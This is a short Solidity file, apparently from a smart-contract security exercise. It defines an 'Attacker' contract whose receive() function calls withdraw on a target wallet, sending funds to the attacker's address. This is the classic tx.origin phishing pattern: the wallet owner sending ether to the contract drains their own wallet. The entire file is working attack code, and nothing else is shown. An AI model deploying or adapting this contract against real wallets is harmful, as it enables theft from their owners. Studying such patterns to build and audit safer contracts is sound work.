//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "hardhat/console.sol";


interface IWallet {
    function withdraw(address _recipient) external;
}

contract Attacker {
    IWallet private immutable wallet;
    address public owner;
    
    constructor(IWallet _walletAddress) {
        wallet = _walletAddress;
        owner = msg.sender;
    }

    receive() external payable {
        wallet.withdraw(owner);
    }
}
